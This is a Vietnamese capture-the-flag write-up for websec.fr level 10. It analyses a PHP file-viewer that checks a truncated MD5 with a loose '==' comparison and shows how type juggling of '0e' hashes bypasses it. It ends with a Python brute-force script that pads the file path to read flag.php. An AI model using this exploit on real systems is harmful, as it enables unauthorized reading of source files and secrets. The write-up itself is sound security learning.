# Đoạn code xử lý logic  
```PHP
<?php include "flag.php"; ?>
<?php
    if (isset($_REQUEST['f']) && isset($_REQUEST['hash'])) {
        $file = $_REQUEST['f'];
        $request = $_REQUEST['hash'];

        $hash = substr(md5($flag . $file . $flag), 0, 8);

        echo '<div class="row"><br><pre>';
        if ($request == $hash) {
            show_source($file);
        } else {
            echo 'Permission denied!';
        }
        echo '</pre></div>';
    }
?>
```  
# Phân tích luồng hoạt động
```PHP
$file = $_REQUEST['f'];
$request = $_REQUEST['hash'];
```  
Biến `file` nhận giá trị tên file muốn đọc  
Biến `request` nhận giá trị của `hash` từ ô nhập vào của người dùng  

```PHP
 $hash = substr (md5 ($flag . $file . $flag), 0, 8);
```

Đoạn này thực hiện việc nối tên file với 1 giá trị `flag` sau đó băm bằng thuật toán md5 rồi lấy 8 kí tự đầu tiên. Ví dụ: Tên file nhập vào là `index.php`, sau đó nó sẽ được nối với giá trị biến flag có dạng `$flagindex.php$flag`. Sau đó sẽ được mã hóa md5 và cuối cùng lấy ra 8 ký tự đầu tiên. 

Điểm sáng để khai thác ở đây là, thay vì dùng hàm hash_hmac() để tự động mã hóa, đoạn code lại dùng cách nối chuỗi thủ công để băm. Điều này dẫn đến việc giá trị của `flag` được hash và hiển thị trực tiếp ra màn hình.

Tuy nhiên, việc dịch 1 đoạn mã về lại thành bản rõ là không thể, trong khi bài này còn chỉ lấy ra 8 ký tự đầu tiên.  
=> Không mong chờ :))

```PHP
 if ($request == $hash) {
    show_source ($file);
} else {
    echo 'Permission denied!';
}
```

Đoạn này thực hiện việc so sánh 8 ký tự vừa lấy ra, và chuỗi `hash` ta nhập ban đầu để so sánh.  
* Nếu True: in ra kết quả của file nhập vào
* Nếu False: in ra `Permission denied!`

Điểm khai thác ở đây là việc ứng dụng sử dụng `==` để so sánh. Toán tử `==` trong PHP sẽ cố gắng ép kiểu (type juggling) hai vế về cùng một kiểu dữ liệu để so sánh.  
**Ví dụ:**  
* Nếu một chuỗi hash MD5 bắt đầu bằng 0e và theo sau chỉ toàn là số (ví dụ: 0e123456...), PHP sử dụng toán tử `==` sẽ hiểu đây là ký hiệu khoa học của số mũ (0x10mũ123456). Mà 0 mũ bao nhiêu thì vẫn bằng 0.

=> Việc của ta bây giờ là đi tìm một chuỗi hash MD5 bắt đầu bằng 0e và theo sau chỉ toàn là số. Khi đó khi nhập `hash`=0 thì ta đã có thể thực hiện bypass câu lệnh điều kiện này.

Vậy làm sao để kiểm soát dữ liệu đầu vào để tìm được 1 chuỗi hash thỏa mãn điều kiện như trên.  
Trước hết nên biết là việc thực hiện `cat ./test.txt` và `cat .//test.txt` đều trả về kết quả giống nhau đó là giá trị của file test.txt.  
Do đó, ta sẽ chèn các ký tự `/` vào cho đến khi chuỗi hash được tạo ra thỏa mãn yêu cầu  

# Payload exploit

```python
import requests

count = 1
while True:
    res = requests.get("http://websec.fr/level10/index.php?hash=0&f={}".format("." + count*"/" + "flag.php"))
    if (res.text.find("WEBSEC{") != -1):
        print(res.text)
        print(count)
        break
    else:
        count += 1
        print(count, len(res.text))
```